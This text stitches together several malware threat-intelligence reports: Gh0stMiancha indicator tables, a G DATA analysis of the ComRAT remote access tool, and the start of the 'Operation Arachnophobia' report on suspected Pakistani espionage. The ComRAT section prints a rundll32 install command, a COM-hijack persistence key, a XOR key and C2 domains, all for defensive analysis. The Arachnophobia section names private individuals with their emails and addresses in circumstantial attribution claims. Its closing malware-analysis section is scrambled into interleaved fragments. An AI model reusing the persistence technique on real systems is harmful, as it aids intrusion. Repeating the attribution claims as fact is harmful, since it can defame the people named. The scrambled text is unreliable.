Obfuscated TrojanLoader:W64/Gh0stMiancha
MD5                     01f7b465242237bd3d31d39767aa68e0
SHA1                    db4ec59bf7f34a21f9dc7f2ded68c616f7c0fe47
SHA256                  ed39c1d86ff8cfe18ef58e850d205a678d255150324b00661b91448173c94900
Size (bytes)            12347
Compile Time            N/A
In-the-wild Filenames   dll64.tmp
TrojanLoader:W64/Gh0stMiancha
MD5                     008fbd0fde06edb31fc7eecdae1a3030
SHA1                    b9ae0a079cd1dae96425ced4bb96ba0f71c87a7a
                                TLP: WHITE                                        Page 9 / 11
                                 TLP: WHITE
SHA256                  cc8d38d3cc214ff3ad10d6859a88e018b1f7e0ed6df7d04a6f4368bda851ba14
Size (bytes)            12347
Compile Time            2013-11-26 11:47:39 UTC
In-the-wild Filenames   install.ocx
PDB String              C:\Users\why\Desktop\server(
)\x64\Release\server.pdb
Obfuscated Trojan:W32/Gh0stMiancha
MD5                     569071c45f47b7fb7a75f30bc07d5739
SHA1                    540bb9d2dee8f4e10e5ae0a5cc900b346a57a198
SHA256                  8a00b2aefdcd0bb22013bbe9c7941fa16af8246e545e1522622006b9c88ca716
Size (bytes)            169019
Compile Time            N/A
In-the-wild Filenames   instructions.pdf
Trojan:W32/Gh0stMiancha
MD5                     916b1a07efb145c450b4c13540be6c3e
SHA1                    7984639beb4e9870301d3b44a68b4346f9a6b826
SHA256                  f26c2e9bee680f8e4d7afd73e2984a6697263334d2f0049a40e050d75293035e
Size (bytes)            169019
Compile Time            2013-12-06 08:08:28 UTC
In-the-wild Filenames   N/A
PDB String              h:\2013.11.25\
\server(update.dll)(instructions.pdf)\Release\server.pdb
Obfuscated Trojan:W64/Gh0stMiancha
MD5                     55474f8e26f2b6fc3b5d78ce9a77b0b0
SHA1                    3f714c33992e906e69df2d5d4971beaed336d9f4
SHA256                  27e5670f68ff68acc80716c6870f4e5d06c471791f087d5b9b7613f8dc700037
Size (bytes)            233019
Compile Time            N/A
In-the-wild Filenames   instructions64.pdf
Trojan:W64/Gh0stMiancha
MD5                     1d2c77f0f8a715de09ce6fae5fc800d4
SHA1                    30784735763b060a39f76c29439a6aebbf6a4b9b
SHA256                  2fdf454f6b1c82d757d054bea5f0438f5da1ecd9e5059610d3d4b74e75a7c8b0
Size (bytes)            233019
Compile Time            2013-12-06 08:10:34 UTC
In-the-wild Filenames   N/A
PDB String              C:\Users\why\Desktop\server(update.dll)(instructions.pdf)x64\x64\Release\server.pdb
                                TLP: WHITE                                                            Page 10 / 11
                                 TLP: WHITE
Context Information Security - Threat Intelligence - threat@contextis.co.uk
London (HQ)            Cheltenham                 D
sseldorf              Melbourne
4th Floor              Corinth House              1.OG                    4th Floor
30 Marsh Wall          117 Bath Road              Adersstr. 28            155 Queen Street
London E14 9TP         Cheltenham GL53 7LS        40215 D
sseldorf        Melbourne VIC 3000
United Kingdom         United Kingdom             Germany                 Australia
                               TLP: WHITE                                             Page 11 / 11
The Uroburos case: new sophisticated RAT identified
In February 2014, the experts of the G DATA SecurityLabs published an analysis of Uroburos, the
rootkit with Russian roots. We explained that a link exists between Uroburos and the Agent.BTZ
malware, which was responsible for "the most significant breach of U.S. military computers ever."
[1] Nine months later, after the buzz around Uroburos, aka Snake or Turla, we now identified a new
generation of Agent.BTZ We dubbed it ComRAT and, by now, analyzed two versions of the threat
(v3.25 and v3.26).
As reported earlier this year, Agent.BTZ used the same encoding key and the installation log file name as Uroburos.
ComRAT, in its version 3.25, shows the same behavior. Furthermore, the attackers also shared a C&C domain. The
latest version of ComRAT known to us (v3.26) uses a new key and does not create the installation log file, in order to
complicate the analysis and to disguise the link between the two cases.
Another very interesting fact: the attackers use COM Object hijacking, the same persistence mechanism as
COMpfun, which we described recently.
Taken everything into consideration, the indications we saw during our analyzes lead to the supposition that the
group behind Agent.BTZ and Uroburos is still active and is pursuing the Agent.BTZ path once more to improve and
change the RAT.
Dropper
The analyzed file is the latest version we identified: v3.26. The version identification is described in the chapter 
files
. The major difference between this version and the older version(s) will be described there.
File installation
The first task of the malware is to install the file credprov.tlb in %APPDATA%\Microsoft\. This file is the main
payload of the malware. The dropper executes the following command in order to install a second file:
rundll32.exe %APPDATA%\Microsoft\credprov.tlb,Install %APPDATA%\Microsoft\shdocvw.tlp
The second file is shdocw.tlp. The two files are Microsoft Windows dynamic libraries.
Persistence
To be started during the boot process of the infected machine, the malware creates the following registry key:
HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32 =
%APPDATA%\shdocvw.tlp
This registry key is used to associate the library shdocvw.tlp to the object 42aedc87-2188-41fd-b9a3-0c966feabec1
as previously explained in the article about COMpfun. The purpose is to load the library into each and every process
executed on the infected system.
Dropper
s log file
If the version of the malware is older than 3.26, the dropper creates an additional file called winview.ocx. We
noticed that the file name is still the same as the file name used by Agent.BTZ in the past. The file is xored with the
following obfuscation key (used by both, Uroburos and Agent.BTZ):
1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
Here is the decoded log file content:
user1@gdata$ ./decode.py winview.ocx
Log begin: 06.11.2014 22:55:55
TVer=2.2
06.11.2014 22:55:55 TVer=2.3
06.11.2014 22:55:55 CFG: CFG_4
06.11.2014 22:55:55 User: user1
06.11.2014 22:55:55 Machine: x86
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\shdocvw.tlb [2]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\oleaut32.dll [2]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\oleaut32.tlb [2]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\credprov.tlb [2]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\libadcodec.dll [2]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\libadcodec.tlb [2]
06.11.2014 22:55:55 Writing C:\Documents and Settings\user1\Application Data\\Microsoft\\shdocvw.tlb 51200B
06.11.2014 22:55:56 Writing C:\Documents and Settings\user1\Application Data\\Microsoft\\credprov.tlb
260096B Ok
06.11.2014 22:55:57 Exit code1 0
06.11.2014 22:55:57 Writing 3072B Ok
We can notice that the malware checks if an older version is installed on the system and if this is the case, the
dropper removes the older version. In contrast to this, in our Uroburos analysis, we found out that Uroburos does
not install itself in case a version of Agent.BTZ was found on a system.
Execution flow and features
During the startup of the infected machine, the shdocvw.tlp library is loaded into all processes. If the process is
explorer.exe, this library will load the other library called credprov.tlb. This library is the real payload. Its features
are common for a Remote Administration Tool (RAT):
      command execution;
      file download;
      file upload;
      information gathering.
ComRAT
s communication to the command and control server is performed by the browser process and not by
explorer.exe in order to avoid being blocked by a firewall on the system or any additional security products. The
communication between the processes is performed by named pipe.
Log files
Two log files are created during the malware execution: mskfp32.ocx and msvcrtd.tlb. If the malware version is
older than 3.26, the xored key is the same as the dropper key. Concerning the version 3.26, the malware uses a new
non-ASCII key. Here is an example of decoded log file for the version 3.26:
user1@gdata$ ./decode.py mskfp32.ocx
<?xml version="1.0" encoding="unicode"?>
<Ch>
<TVer>2.1</TVer>
<AppendLog>0</AppendLog>
<add key="Id" value="168466483094462" />
<add key="PVer" value="3.26" />
<add key="OSVer" value="512600 Service Pack 30" />
<add key="Machine" value="x86" />
<add key="CryptKeyType" value="3" />
<add key="CryptKeyId" value="0" />
<add ke="IsAdmin" value="1" />
<add key="Http idx1" value="4294967295" />
<add key="Http idx2" value="4294967295" />
<add key="Http timeout" value="60" />
<add key="Time" value="06:11:2014 15:54:34" />
<add key="Bias" value="-2" />
<add key="PcName" value="USER1-ABC1234" />
<add key="UserName" value="user1" />
<add key="WinDir" value="C:\\WINDOWS" />
<add key="TempDir" value="C:\\DOCUME~1\\user1\\LOCALE~1\\Temp\\" />
<add key="WorkDir" value="C:\\ Documents and Settings\user1\Application Data\\Microsoft\\" />'
</Ch>
We can identify the version of the malware thanks to the PVer flag. The command and control server information is
stored in the registry, not in an XML, and encoded:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionMRU\IPlace
For example, in the analyzed sample the CC is: weather-online.hopto.org. This domain is far from unknown, as it
has been mentioned in BAE System
s Uroburos (aka Snake) analysis paper as C&C server domain for the Uroburos
malware. Another connection between the cases.
If the malware version in lower than 3.26, the XML log file contains the command and control server information:
<add ke="IsAdmin" value="1" />
<add key="Http address" value="webonline.mefound.com" />
<add key="Http address" value="sportacademy.my03.com" />
<add key="Http address2" value="easport-news.publicvm.com" />
<add key="Http address2" value="new-book.linkpc.net" />
<add key="Http idx1" value="4294967295" />
Summary
Let us summarize the similarities and differences between Agent.BTZ, Uroburos and ComRAT as far as we can:
Similarities:
Before version 3.26:
      use of the same xor key
      use of the same file name for the log
On all versions:
      Some parts of the code are exactly the same (appears to be copy & paste)
      That is the reason why the sample is detected as Uroburos (aka Turla). The same code was used by Agent.BTZ
      and also the dll loaded into userland during the Uroburos analysis.
      Command and control server domains are shared between Uroburos and ComRAT.
Differences:
      In version 3.26, the author changed the key and remove the known file name
      This action can be an indication for the developer
s effort to hide this connection
      The main difference is the design
      Agent.BTZ is a common RAT, a simple library executed on an infected machine. ComRAT is more complex
      and cleverer. The malware is loaded into each and every process of the infected machine and the main part
      (payload) of the malware is only executed in explorer.exe. Furthermore, the C&C communication blends into
      the usual browser traffic and the malware communicates to the browser by named pipe. It is by far a more
      complex userland design than Agent.BTZ.
These differences, mainly the more complex design, lead us to give this malware a new name.
The analyzed dropper of v3.25 has a compilation date of February 6th 2014. The more recent dropper of v3.26,
which has all the mentioned changes implemented, reveals a compilation date of January 3rd 2013. We suspect that
this date is spoofed in order to disguise that this is in fact a newer version.
Conclusion
This analysis shows that even after the Uroburos publication in February 2014, the group behind this piece of
malware seems to be still active. In any case, the ComRAT developers implemented new mechanisms, changed keys,
removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT, the rootkit
Uroburos and the RAT Agent.BTZ as much as possible. However, we can still follow the evolution of the malware by
comparing the versions.
The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet
manner and we estimate that other actors will use the same persistence mechanism in the near future.
We will definitely keep our ears and eyes open and continue analyzing.
51e7e58a1e654b6e586fe36e10c67a73 (dropper v3.25)
e6ce1f962a47479a86ff2e67129f4ecc (lib1, v3.25)
ec7e3cfaeaac0401316d66e964be684e (lib2, v3.25)
0ae421691579ff6b27f65f49e79e88f6 (dropper v3.26)
255118ac14a9e66124f7110acd16f2cd (lib1 v3.26)
b407b6e5b4046da226d6e189a67f62ca (lib2, v3.26)
8ebf7f768d7214f99905c99b6f8242dc (dropper, unknown version)
9d481769de63789d571805009cbf709a (dropper, unknown version)
83a48760e92bf30961b4a943d3095b0a (lib 64-Bit, unknown version)
ea23d67e41d1f0a7f7e7a8b59e7cb60f (lib 64-Bit; unknown version)
Paths
%APPDATA%\\Microsoft\\shdocvw.tlb
%APPDATA%\\Microsoft\\oleaut32.dll
%APPDATA%\\Microsoft\\oleaut32.tlb
%APPDATA%\\Microsoft\\credprov.tlb
%APPDATA%\\Microsoft\\libadcodec.dll
%APPDATA%\\Microsoft\\libadcodec.tlb
Registry
HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32
Command and control
weather-online.hopto.org
webonline.mefound.com
sportacademy.my03.com
easport-news.publicvm.com
new-book.linkpc.net
-------------------------------
Related articles:
October 30th 2014: COM Object hijacking: the discreet way of persistence
June 2nd 2014: Analysis of Uroburos, using WinDbg
May 13th 2014: Uroburos rootkit: Belgian Foreign Ministry stricken
March 3rd 2014: Uroburos - Deeper travel into kernel protection mitigation
February 28th 2014: Uroburos - highly complex espionage software with Russian roots
-------------------------------
[1] www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain
Operation
Arachnophobia
Caught in the Spider
s Web
Rich Barger | Cyber Squared Inc.
Mike Oppenheim | FireEye Labs
Chris Phillips | FireEye Labs
Contents
Team Introduction....................................................................................................................................................... 1
Key Findings.................................................................................................................................................................. 1
Summary....................................................................................................................................................................... 1
Backstory......................................................................................................................................................................2
VPSNOC/Digital Linx/Tranchulas............................................................................................................................ 4
Technical Observations...............................................................................................................................................8
Conclusion....................................................................................................................................................................11
Appendix A: Malware Details................................................................................................................................... 12
Appendix B: MD5 Hashes and Malware Table........................................................................................................ 17
Appendix C: VPSNOC Email Header Analysis....................................................................................................... 20
Appendix D: Inconsistencies Observed................................................................................................................... 21
Appendix E: VPSNOC & Digital Linx Associations.................................................................................................23
Appendix F: Personas.................................................................................................................................................24
      Persona #1................................................................................................................................................................................ 24
      Persona #2................................................................................................................................................................................ 27
Appendix G: Tranchulas........................................................................................................................................... 30
Digital Appendix 1: Research Collateral...................................................................................................................32
Digital Appendix 2: Raw Email Communications...................................................................................................33
Digital Appendix 3: Screenshot Archives................................................................................................................34
Digital Appendix 4: Maltego Visualization.............................................................................................................35
i    
     OPERATION ARACHNOPHOBIA
Team Introduction
Cyber Squared Inc.
s ThreatConnect Intelligence Research Team (TCIRT) tracks a number of threat groups around the world.
Beginning in the summer of 2013, TCIRT identified a suspected Pakistani-origin threat group. This group was revealed by TCIRT
publicly in August 2013. In the months following the disclosure, we identified new activity. Cyber Squared partnered with experts
at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its
Operation 
Arachnophobia
. The following report is a product of collaborative research and threat intelligence sharing between
Cyber Squared Inc.
s TCIRT and FireEye Labs.
Key Findings
 While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently
    point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets and/or
    those who are involved in India-Pakistan issues.
 The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S. for
    command and control (C2).
 The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with
    two IP addresses operated by a Pakistan-based hosting provider.
 Early variants of the BITTERBUG malware had build paths containing the strings 
Tranchulas
 and 
umairaziz27
    Tranchulas is the name of a Pakistani security firm; Umair Aziz is the name of a Tranchulas employee.
 Following the release of our blog post highlighting this activity and the malware
s build strings, the threat actors appear to have
    modified their binary file paths to make them more generic.
 Employees at both the Pakistan-based hosting provider and Tranchulas appear within each others
 social networks.
Summary
On August 2, 2013, the TCIRT published the blog 
Where There is Smoke, There is Fire: South Asian Cyber Espionage Heats
 in which TCIRT identified custom malware, later dubbed BITTERBUG by FireEye, suspected to be linked to Pakistani-based
exploitation activity directed against Indian entities. We found debug path references to 
Tranchulas
, which is also the name
of a Pakistani security company. Tranchulas claims to support 
national level cyber security programs
 and the development of
offensive and defensive cyber capabilities. At the time, the incident seemed to be an isolated one for TCIRT, but it was only the
beginning. Our suspicions of Tranchulas
 involvement in the activity began to mount, based on a series of events that occurred
both before and after the release of our blog post.
During the past year, we communicated with Tranchulas and the Pakistan-based hosting provider. Suspicious responses and
oddly similar replies received from both companies to our inquiries, as well as anomalies in their email headers, prompted us to
research the companies further. Our research revealed:
 The C2 hosting provider (VPSNOC) has likely been conducting business operations from within Pakistan, subleasing
    infrastructure from U.S. providers.
 VPNSOC and Tranchulas employees have maintained some type of undefined relationship given connections via social media.
 Both organizations have employed or are affiliated with personnel who have offensive cyber expertise.
 When TCIRT was initially contacted by Tranchulas following our original blog post, they denied any involvement in the activity.
    Tranchulas maintained that they were being framed, and that they were already aware of the activity prior to both our blog post
    and our contact. However, inconsistencies in their claims and their responses made such a scenario questionable.
1    
    OPERATION ARACHNOPHOBIA
Backstory
TCIRT began tracking a set of activity involving a BITTERBUG variant in May 2013. To our knowledge this customized malware
has only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.431 and
199.91.173.45.2 3 According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,
Missouri. Based on public records, this organization appears to be a legal entity chartered to conduct business in Missouri.4
On July 24, 2013, TCIRT contacted the Kansas City-based hosting provider to notify them of the malicious activities emanating
from IP address 199.91.173.43. The hosting provider subsequently introduced5 TCIRT to their client VPNSOC, the customer
responsible for subleasing the IP address. Later that day, TCIRT received a response6 from support@vpsnoc.com providing
limited information on the server and related traffic (Figure 2). When TCIRT sent follow-up communications, VPSNOC did not
respond, further increasing our suspicions.
                                                       Figure 2: VPSNOC Response
       https://www.virustotal.com/en/ip-address/199.91.173.43/information/
       https://www.virustotal.com/en/ip-address/199.91.173.45/information/
       http://www.shodanhq.com/search?q=93c546-b1-4dbcbc6438380
       https://bsd.sos.mo.gov/BusinessEntity/BusinessEntityDetail.aspx?page=beSearch&ID=2936099
       Digital Appendix 2: Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500).eml
       Digital Appendix 2: Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500).eml
2    
    OPERATION ARACHNOPHOBIA
While reviewing the metadata of VPSNOC
s July 24, 2013 email response, we noticed the email was sent from a +0500 time zone.
This time zone usage is consistent with Pakistan
s time zone.7
The TCIRT published details of the initial activity in the aforementioned blog post on August 2, 2013. Four days later on August 6,
2013, the Tranchulas Chief Executive Officer, Zubair Khan, contacted us regarding the blog post and its subsequent press coverage.8
Khan submitted 
Response_ThreatConnect.docx
9 as an explanation of the observed activity to both the media and the
TCIRT indicating that the debug paths using 
Tranchulas
 and 
umairaziz27
 was 
done by developer of malware to portray
wrong impression about Tranchulas and mislead malware analysts
. Notably, Khan included a screenshot of an email message. The
message was reportedly a response from VPSNOC to an email message from Tranchulas sent on July 21, 2013, purportedly to notify
VPSNOC of the same malicious activity identified by TCIRT. However, we noted certain anomalies in this message.
                        Figure 3: Screenshot (image1.png) included within Response_ThreatConnect.docx
As seen in Figure 3 the 
email message
 10 was 
sent
 to VPSNOC from an unidentified tranchulas.com email address on 
Tue,
Jul 21, 2013 at 11:36 PM.
 July 21, 2013 was not a Tuesday and in fact was a Sunday. The mismatched date suggests that this
email message was potentially modified in order to support the claim that Tranchulas was aware of, and had already reported the
exploitation activity. TCIRT speculates that 
Tuesday
 was hastily chosen because our own official notification to VPSNOC was sent
on Wednesday the 24th. In addition, the 
response
 received by Tranchulas is nearly identical to that received by TCIRT. We believe
that Tranchulas may have obtained information about TCIRT
s notification to VPSNOC through a pre-established relationship.11
Digital Appendix 2: Raw Email Communications (Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500.eml) &
   (Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500.eml)
        http://www.theregister.co.uk/2013/08/07/india_cyberespionage/
Digital Appendix 2: Raw Email Communications (Email#3 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up
   (Date- Wed, 7 Aug 2013 03-18-57 +0500).eml)
       Digital Appendix 1: Research Collateral image1.png (MD5:d224f39f8e20961b776c238731821d16) within Response_ThreatConnect.docx
       Appendix F: Personas (Persona #2)
3     
    OPERATION ARACHNOPHOBIA
The TCIRT responded to Mr. Khan
s official explanation with a follow-up inquiry, offering Khan an opportunity to explain the notable
date inconsistency within the email screenshot. The TCIRT also requested that Mr. Khan share the actual email message with the
original attached headers. Mr. Khan did not address the TCIRT question, but rather deferred our request to Mr. Hamza Qamar,
a Penetration Testing Team Lead at Tranchulas. On August 15, 2013, three days later, Qamar responded to TCIRT with a brief
denial12 of any modifications to the screenshot (other than email address anonymization) and specifically referred TCIRT back to
VPSNOC support (support@vpsnoc.com) for any follow up questions.
Astonished by this dismissal and deflection, TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas.
VPSNOC/Digital Linx/Tranchulas
During our research into VPSNOC, we identified that it is actually based in, or conducts partial operations from within, Pakistan.
The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space (Figure
4). The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting. Digital Linx is also a
Pakistan-based hosting company (Figure 5).
                                      Figure 4: Screenshot of VPSnoc.com About us page
Digital Appendix 2: Raw Email Communications (Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up -
    (Date- Thu, 15 Aug 2013 12-52-54 +0500).eml
4   
   OPERATION ARACHNOPHOBIA
                        Figure 5: Digital Linx (digitallinx.com)                             Figure 6: Screenshot of DigitalLinx.net
                            Website indicating its location                                                contact page
As seen in Figure 6, the administrative email address is admin@digitallinx.org.13 This is the same registrant record for the
digitallinx.net domain.14 The domains digitillinx.org, digitallinx.net, and digitallinx.com share current
and historical similarities in their WHOIS records and sitemap.xml files 15 16 that imply they are all controlled by the same individual
or entity. The domain digitallinx.com is registered to Muhammad Naseer
Bhatti (Digital Linx Founder)17 18 19 who uses email
addresses naseer@digitallinx.com and nbhatti@gmail.com. The domain is also registered to the address 638-F Johar
Town, Lahore Pakistan.20
The contact telephone number listed on Digital Linx
 web site is 925-665-1427 (Figure 6), and is also used in the WHOIS record
for defiantmarketing.com21.
The domain defiantmarketing.com is registered to Abunasar Khan. The registration lists VPSNOC as the registrant organization,
abunasar@yahoo.com as the registration email address, and House 12, Street 21, F-8/1 Islamabad Federal 44000 as the
registration address. Abunasar Khan has been observed using the aliases 
agnosticon
 22 and 
agnostic
. From this we were able to
locate an advertisement in the Blackhatworld forum from April 2012 posted by agnosticon promoting VPSNOC and identifying it as
a subdivision of Digital Linx Hosting (Figure 7).23 Though none of this information is surprising, it further suggests that both Bhatti and
Abunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan.24
       https://whois.domaintools.com/vpsnoc.com
       https://whois.domaintools.com/digitallinx.net
       http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us
       http://digitallinx.net/Contact.html
       https://whois.domaintools.com/digitallinx.com
       http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815
       https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ
       https://github.com/digitallinx/vBilling/blob/master/CHANGELOG
       https://whois.domaintools.com/defiantmarketing.com
       http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html
       http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html
       https://dazzlepod.com/rootkit/?page=284
5     
     OPERATION ARACHNOPHOBIA
                   Figure 7: Blackhatworld advertisement identifying VPSNOC as a Digital Linx subdivision25
Additional research into Abunasar Khan identified several registered domains and fragments of his online presence. Based on his
websites and account information, he appears to have an interest or participated in the Antisec26 and Anonymous27 movements
(Figure 8). He also used 
anony mo us
 in the registration name field of a personal account 28.
In addition, Abunasar Khan
s Google+ profile revealed connections to at least one Tranchulas employee, Hamza Qamar29 and a
Digital Linx employee, Shoaib Riaz.30 31Hamza Qamar, the Team Lead for Penetration Testing at Tranchulas, with whom TCIRT last
spoke.32 Visiting Hamza Qamar
s Google+ page (Figure 9), the only directly connected person was Abunasar Khan. At this point, it
shows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with
Hamza Qamar, the Penetration Testing employee from Tranchulas.
                                                    Figure 8: Abunasar.net main page
       http://vpsnoc.com/order.png
       http://abunasar.net
       http://pastebin.com/rqVGqh1q
       https://dazzlepod.com/rootkit/?page=284
       https://plus.google.com/105774284158907153401/about
       https://plus.google.com/105059395104464629441/about
       http://lists.horde.org/archives/horde/Week-of-Mon-20061225/032545.html
       https://plus.google.com/103436628630566104748/posts
6     
     OPERATION ARACHNOPHOBIA
                                          Figure 9: Qamar
s only connection out of 40+ followers
Qamar indicated on his public LinkedIn profile that he 
engaged in system and enterprise level network and Web application
security testing for clients ranging from large federal agencies, DoD, and commercial clients
, though it is unclear which 
is referenced (e.g., whether the Pakistani Ministry of Defense or some other nation
s defense department). Tranchulas identifies
government (presumably Pakistan
s government) as an operational sector for its work. Tranchulas
 offensive cyber initiative
services are offered to 
national-level cyber security programs
 33 34 indicating commercial demand from 
national-level
 customers.
Though Tranchulas35 brands itself as a multi-national company, with respective addresses within the United Kingdom36, the United
States37, and New Zealand38. We found evidence that these addresses are all associated with either virtual office spaces or
address forwarding services.
For further background information on these personas, please see Appendix F: Personas.
The following is a summary of the relationships between the hosting organizations and Tranchulas:
 VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that
    contained build strings that referenced 
Tranchulas
 and a Tranchulas employee.
 Tranchulas and VPNSOC were in direct communication at some point in July-August 2013.
 VPNSOC is a subsidiary of Digital Linx.
 Tranchulas, VPNSOC, Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S.
 Hamza Qamar was an employee of Tranchulas.
http://www.prnewswire.co.uk/news-releases/tranchulas-steps-into-the-global-cyber-strategy-market-with-launch-of-the-offensive-cyber-
    initiative-oci-230411011.html
       Digital Appendix 3: Screenshot Archives (tranchulas.com/offensive-cyber-initiative-oci.png)
       Digital Appendix 3: Screenshot Archives (tranchulas.com/contact-us)
       http://www.londonpresence.com/contact-us/
       http://nextspace.us/nextspace-union-square-san-francisco/
       http://www.privatebox.co.nz/virtual-office/virtual-office-address.php
7     
    OPERATION ARACHNOPHOBIA
 Muhammad Naseer
Bhatti was the self-proclaimed founder of Digital Linx.
 Abunasar Khan was affiliated with AntiSec and VPNSOC.
 Digital Linx founder Muhammad Naseer
Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan39 
    connected through domain registrations and a common Google+ profile for Shoaib Riaz (another Digital Linx employee).
 VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+.
Note: A walkthrough of our research is available in Appendices C, D and E.
Technical Observations
Metadata Analysis:
As mentioned earlier, during the email exchanged with Zubair Khan, he sent TCIRT a Microsoft Word document (.docx). In
reviewing the document metadata for 
Response_ThreatConnect.docx 
, TCIRT identified that it contained the creator
properties of 
 TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and
found that both also had the author of 
 (Figure 10).
                        Decoys associated with BITTERBUG                               Tranchulas Documents
                                           Figure 10: Matching Document Author Metadata
       http://www.know-hosting.com/view/27108-digitallinx.html
8     
    OPERATION ARACHNOPHOBIA
While the author field of 
 doesn
t conclusively prove a relationship, it contributes to the body of circumstantial evidence which
links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with
BITTERBUG targeting campaigns.
Malware Analysis:
CyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity. FireEye
analyzed the malware,   which
              date.
    they call
                               earliest
   BITTERBUG,
                                            samples
         and determined
                                                        of
BITTERBUG
    it to be
                                                                            contain
 the
Tranchulas
                                                                                          a custom   backdoor. The backdoor
                                                                                                                 debug
 path
relies on various
support components, including
            (below),
         the non-malicious,
                         as
mentioned
Apublically available
                                                           ugust
2013
    Libcurl
                                                                             TCIRT
       for
                                                                                       blog
                                                                                          40
                                                                                                  installation,
                                                                                                post.
 These
Blaunch, and communications. In
                                                                                                                      ITTERBUG
some variants,variants
              BITTERBUG    were
                             hasptherobably
                                      ability toused
attacks
                                                  automatically      targetaround
 summer
                                                                              and exfiltrate     2013,
                                                                                             files         using
possible
                                                                                                   with extensions     such aslures
                                                                                                                                 .doc, .xls, .pdf, .ppt,
            date.
.egm, and .xml. TheTfull
                      he
             related
     earliest
                         tmalware
                          o
            samples
 odf
eath
                                the
then-
recent
                                         report is included   BITTERBUG
                                                                 in o             cA:ontain
                                                                        f
Sarabjit
                                                                       Appendix                 the
                                                                                           Singh
                                                                                      Malware           
Tranchulas
                                                                                                      (an
                                                                                                     Details.                 debug
                                                                                                              Indian
national
     path
                                                                                                                                     imprisoned
                                             (below),
maentioned
                                              in
Pakistan)
                in
                                                                   nd
Indian
      August
2013
                                                                                          Government
          TCIRT
                                                                                                            pension
    blog
 post.
These
                                                                                                                             emorandum.
      As
BsITTERBUG
                                                                                                                                                          tated
The earliest evidence of w
              variants
               original
the malware
                             ere
                            blog
 (pand
 rfamily
                                        robably
  udates
                                                       sed
                                                 aised
          toafApril
                                                           in
tihe
                                                                   n
      2013,
                                                                          ttacks
                                                                          ormal
      basedson
                                                                                     aTround
   Portable
                                                                                                 ummer
                                                                                       ranchulas
         Executable
                                                                                                           2013,
                                                                                                     response),
   sing
(PE)
                                                                                                                    sueveral
   compile
                                                                                                                              possible
    times, with more than
                                                                                                                                           lures
                                                                                                                                 binaries
10 BITTERBUG variants
           related
            contain
 robserved
                       to
           to date.     The
                              the
then-
recent
                          eferences
                  earliest
                                             to
Cath
                                                       death
            
samples
                                                              in
 debug
ofpSBITTERBUG
                                                                              Sarabjit
     ingh
                                                                                               ath.
                                                                                                                an
   contain nthe
                                                                                                                        Indian
                                                                                                                      important
Tranchulas
                                                                                                                                   ational
      that
debug path (below),
                                                                                                                                           note
imprisoned
as mentionedin
             in    P akistan)
                   the August
              
Cath
          aand
                               2013
                          files
  re
aTCIRT
                                            sn
 Indian
 Gpost.
                                                                overnment
                                                      blogcomponents
                                             upport
                       pension
                                                                     These BITTERBUG
                                                                            and
         m  emorandum.
                                                                                             variants         As
stated
                                                                                                      werevprobably
                                                                                    not
BITTERBUG
                so
inin
                                                                                                                      used
                                                                                                           ariants,
                      pthe
                                                                                                                                       s
attacks   around summer
                                                                                                                                               robable
             original
2013, using possible      blog
                       lures    w(ere
                                   and
                             related
              that
these
              raised
tbhe
                                          dtoeveloped
                                              the then-recent    y
afnother
                                                                        ormal
                                                                         death of Tpranchulas
                                                                                     
Sarabjit         response),
                                                                                     arty
Singh
                                                                                                     are
(an Indianseveral
                                                                                                                             national
                                                                                                                   required
         bimprisoned
                                                                                                                                          inaries
                                                                                                                                component
           in Pakistan) and an
                                                                                                                                                of
             contain
              family.
